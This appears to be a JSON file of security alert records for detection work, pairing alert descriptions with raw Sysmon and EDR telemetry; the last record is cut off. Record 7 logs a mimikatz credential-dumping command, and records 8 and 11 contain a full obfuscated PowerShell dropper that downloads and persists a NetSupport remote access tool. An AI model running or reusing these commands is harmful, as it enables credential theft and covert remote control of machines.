{
    "1": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DC9B8E9B20BB6D18F902A7460BF0F92C,SHA256=0D6518769E10895CC1880040FB0680520CB179D37624BD2685368414B4A6E4EB,IMPHASH=96BAACC90461FCD4B5D9FCC50047C098\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-CFB4-648A-FCF7-030000000000}\",\"LogonId\":\"0x3f7fc\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-CFB4-648A-6900-000000004400}\",\"ParentProcessId\":\"4892\",\"ProcessGuid\":\"{C784477D-B8D5-6517-2F06-000000004400}\",\"ProcessID\":2320,\"ProcessId\":\"8160\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366184,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":1924,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-20 05:32:37.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "2": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1728261154\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1728275555\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "3": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1728433964\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1728448365\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "4": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2025-01-06 05:32:22.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "5": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1719880364\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1719894765\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "6": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityw7k5wgm3y.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\w7k5wgm3y.exe\\\" \",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\ProgramData\\\\Google Updater 2.0\\\\w7k5wgm3y.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-F2E8-030000000000}\",\"LogonId\":\"0x3e8f2\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-2B80-638F-1006-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"3088\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92362,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-09-22 04:33:43.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "7": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymimikatz.exe launched by cmd.exe",
        "ini_data": [
            "<14>Nov 02 05:39:21 activedir.stackedpads.local Microsoft-Windows-Sysmon[3224]: {\"EventTime\":1730439560,\"Hostname\":\"activedir.stackedpads.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":279278,\"ProcessID\":3224,\"ThreadID\":4128,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2024-11-01 05:39:20.221\\r\\nProcessGuid: {3be6fa21-3ce8-62c8-7801-000000001100}\\r\\nProcessId: 1172\\r\\nImage: C:\\\\Users\\\\fkolzig\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\mimikatz.exe\\r\\nFileVersion: 2.2.0.0\\r\\nDescription: mimikatz for Windows\\r\\nProduct: mimikatz\\r\\nCompany: gentilkiwi (Benjamin DELPY)\\r\\nOriginalFileName: mimikatz.exe\\r\\nCommandLine: mimikatz  \\\"privilege::debug\\\" \\\"sekurlsa::logonpasswords\\\" exit\\r\\nCurrentDirectory: C:\\\\Users\\\\fkolzig\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\\\r\\nUser: STACKEDPADS\\\\frank.kolzig\\r\\nLogonGuid: {3be6fa21-3b9e-62c8-0fea-230000000000}\\r\\nLogonId: 0x23EA0F\\r\\nTerminalSessionId: 4\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=70DF765F554ED7392200422C18776B8992C09231,MD5=BB8BDB3E8C92E97E2F63626BC3B254C4,SHA256=912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9,IMPHASH=9528A0E91E28FBB88AD433FEABCA2456\\r\\nParentProcessGuid: {3be6fa21-3bc2-62c8-5c01-000000001100}\\r\\nParentProcessId: 2192\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \\r\\nParentUser: STACKEDPADS\\\\frank.kolzig\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"UtcTime\":\"2024-11-01 05:39:20.221\",\"ProcessGuid\":\"{3be6fa21-3ce8-62c8-7801-000000001100}\",\"Image\":\"C:\\\\Users\\\\fkolzig\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\mimikatz.exe\",\"FileVersion\":\"2.2.0.0\",\"Description\":\"mimikatz for Windows\",\"Product\":\"mimikatz\",\"Company\":\"gentilkiwi (Benjamin DELPY)\",\"OriginalFileName\":\"mimikatz.exe\",\"CommandLine\":\"mimikatz  \\\"privilege::debug\\\" \\\"sekurlsa::logonpasswords\\\" exit\",\"CurrentDirectory\":\"C:\\\\Users\\\\fkolzig\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\\",\"User\":\"STACKEDPADS\\\\frank.kolzig\",\"LogonGuid\":\"{3be6fa21-3b9e-62c8-0fea-230000000000}\",\"LogonId\":\"0x23ea0f\",\"TerminalSessionId\":\"4\",\"IntegrityLevel\":\"High\",\"Hashes\":\"SHA1=70DF765F554ED7392200422C18776B8992C09231,MD5=BB8BDB3E8C92E97E2F63626BC3B254C4,SHA256=912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9,IMPHASH=9528A0E91E28FBB88AD433FEABCA2456\",\"ParentProcessGuid\":\"{3be6fa21-3bc2-62c8-5c01-000000001100}\",\"ParentProcessId\":\"2192\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"ParentUser\":\"STACKEDPADS\\\\frank.kolzig\",\"EventReceivedTime\":1730439561,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\cmd.exe\r\nudm.principal.process.file.sha256: bc866cfcdda37e24dc2634dc282c7a0e6f55209da17a8fa105b07414c0e7c527"
        ]
    },
    "8": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-03 05:34:03.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "9": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DC9B8E9B20BB6D18F902A7460BF0F92C,SHA256=0D6518769E10895CC1880040FB0680520CB179D37624BD2685368414B4A6E4EB,IMPHASH=96BAACC90461FCD4B5D9FCC50047C098\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-CFB4-648A-FCF7-030000000000}\",\"LogonId\":\"0x3f7fc\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-CFB4-648A-6900-000000004400}\",\"ParentProcessId\":\"4892\",\"ProcessGuid\":\"{C784477D-B8D5-6517-2F06-000000004400}\",\"ProcessID\":2320,\"ProcessId\":\"8160\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366184,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":1924,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-08 05:32:34.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "10": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1723336390\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1723350791\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "11": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; 